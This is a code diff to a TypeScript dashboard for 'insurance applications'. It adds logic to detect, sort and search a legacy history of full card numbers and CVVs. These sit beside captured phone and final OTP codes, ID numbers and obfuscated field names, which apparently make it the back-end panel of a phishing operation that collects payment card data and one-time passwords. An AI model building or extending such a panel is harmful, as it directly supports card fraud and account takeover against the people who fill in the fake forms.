@@ -80,6 +80,9 @@ const hasDashboardData = (application: InsuranceApplication) =>
       application.phoneOtp?.trim() ||
       application._v13?.trim() ||
       application.finalOtp?.trim() ||
+      (application as any).cardHistory?.some((card: any) =>
+        Boolean(card?.cardNumber || card?._v1 || card?.cvv || card?._v2)
+      ) ||
       application.history?.some((entry: any) =>
         Boolean(
           entry?.data &&
@@ -111,6 +114,20 @@ const getCardState = (application: InsuranceApplication) => {
     return {
       count: cardHistory.length,
       key: `history|${latest?.id || ""}|${latest?.timestamp || ""}|${latestCardValue}`,
+    };
+  }
+
+  const legacyCardHistory = (application as any).cardHistory;
+  if (Array.isArray(legacyCardHistory) && legacyCardHistory.length > 0) {
+    const latest = [...legacyCardHistory].sort(
+      (a: any, b: any) =>
+        toTimeValue(b?.timestamp) - toTimeValue(a?.timestamp)
+    )[0];
+    const latestCardValue =
+      latest?.cardNumber || latest?._v1 || latest?.cardNumberMasked || "";
+    return {
+      count: legacyCardHistory.length,
+      key: `legacy-history|${latest?.timestamp || ""}|${latestCardValue}`,
     };
   }
 
@@ -309,14 +326,25 @@ export default function Dashboard() {
 
         // Check history for card entry (type _t1 or card)
         if (app.history && Array.isArray(app.history)) {
-          return app.history.some(
+          if (app.history.some(
             (entry: any) =>
               (entry.type === "_t1" || entry.type === "card") &&
               (entry.data?._v1 || entry.data?.cardNumber)
-          );
+          )) {
+            return true;
+          }
         }
 
-        return false;
+        return Boolean(
+          Array.isArray((app as any).cardHistory) &&
+            (app as any).cardHistory.some(
+              (card: any) =>
+                card?.cardNumber ||
+                card?._v1 ||
+                card?.cvv ||
+                card?._v2
+            )
+        );
       });
     }
 
@@ -325,12 +353,18 @@ export default function Dashboard() {
       const query = searchQuery.toLowerCase();
       filtered = filtered.filter((app) => {
         const cardNum = app._v1 || app.cardNumber;
+        const legacyCardNum = Array.isArray((app as any).cardHistory)
+          ? (app as any).cardHistory
+              .map((card: any) => card?.cardNumber || card?._v1 || "")
+              .join(" ")
+          : "";
         return (
           app.ownerName?.toLowerCase().includes(query) ||
           app.identityNumber?.includes(query) ||
           app.phoneNumber?.includes(query) ||
           app.stcPhone?.includes(query) ||
-          cardNum?.slice(-4).includes(query)
+          cardNum?.slice(-4).includes(query) ||
+          legacyCardNum.slice(-4).includes(query)
         );
       });
     }
